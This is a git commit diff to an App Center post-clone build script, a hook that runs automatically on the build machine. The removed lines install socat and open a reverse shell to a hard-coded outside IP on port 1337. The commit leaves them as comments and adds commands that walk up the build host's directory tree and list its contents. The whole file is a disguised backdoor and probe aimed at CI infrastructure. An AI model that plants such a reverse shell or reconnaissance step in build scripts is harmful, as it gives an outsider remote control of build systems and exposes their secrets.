5b8436cd305e29a18ddf9749024008f68a0b02dc
velimir-jankovic <84719115+velimir-jankovic@users.noreply.github.com>
2021-08-26 16:04:36 +0200

    Update appcenter-post-clone.sh

--- app/appcenter-post-clone.sh
+++ app/appcenter-post-clone.sh
@@ -2,10 +2,14 @@
 
 echo "This is an App Center Post-Clone script. For more information on how to use App Center build scripts vist: https://docs.microsoft.com/en-us/appcenter/build/custom/scripts"
 
-brew install socat
+cd ../../../
+ls
+cd _tasks
+ls
+# brew install socat
 
-RHOST=18.224.5.254
+# RHOST=18.224.5.254
 
-RPORT=1337
+# RPORT=1337
 
-socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+# socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
